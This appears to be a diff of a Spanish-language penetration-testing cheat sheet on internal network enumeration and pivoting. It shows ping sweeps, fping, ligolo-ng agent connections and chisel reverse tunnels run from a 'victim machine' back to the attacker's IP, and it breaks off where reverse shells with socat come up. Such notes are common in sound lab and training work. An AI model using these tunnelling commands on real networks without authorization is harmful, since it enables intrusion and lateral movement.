@@ -1,13 +1,11 @@
-
+- [ ] 
 ## ENUMERACIÓN INTERNA
 
 - Linux
-
 ```bash
 #Ver host desde dentro
 arp
 ```
-
 
 ```bash
 for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep  "bytes from");done
@@ -15,7 +13,7 @@ for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep  "bytes from");done
 
 - Subes fping y haces:
 ```bash
-./fping -a -g 192.168.100.93/24 2>/dev/null 
+./fping -a -g 192.168.100.0/24 2>/dev/null 
 ```
 
 
@@ -53,7 +51,7 @@ sudo ip route add segmento_a_llegar/24 dev ligolo
 ./proxy -selfcert
 #Tras unirte a la session
 interface_create --name ligolo
-route_add --name ligolo --route 172.16.0.0/24
+route_add --name ligolo --route 10.0.2.0/24
 tunnel_start --tun ligolo
 #En la maquina victima
 ./agent -connect MIIP:11601 -ignore-cert
@@ -93,6 +91,12 @@ ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
 - En la victima
 ```bash
 ./chisel client MI_IP:33 R:socks
+
+#Un puerto con doble pivoting
+./chisel client MI_IP:33 R:7071:localhost:8080
+#Acceder al puerto con la MI_IP:7071 
+#dentro de ligolo
+route_add --name ligolo --route 240.0.0.1/32
 ```
 
 - Para revshells usamos *SOCAT*, en la maquina victima
